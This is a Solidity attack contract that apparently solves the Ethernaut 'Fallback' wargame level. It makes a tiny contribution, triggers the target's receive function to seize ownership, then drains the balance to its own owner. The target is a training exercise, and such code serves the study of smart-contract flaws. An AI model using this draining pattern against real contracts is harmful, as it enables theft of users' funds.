pragma solidity ^0.8.0;

import {Fallback} from "ethernaut/01Fallback.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AttackContract is Ownable {
    Fallback instance;

    constructor(address payable _instance) Ownable(msg.sender) {
        instance = Fallback(_instance);
    }

    function exploit() public {
        instance.contribute{value: 1 wei}();
        (bool success, ) = address(instance).call{value: 2 wei}("");
        require(success, "Failed to transfer ether");
        instance.withdraw();
    }

    receive() external payable {}

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
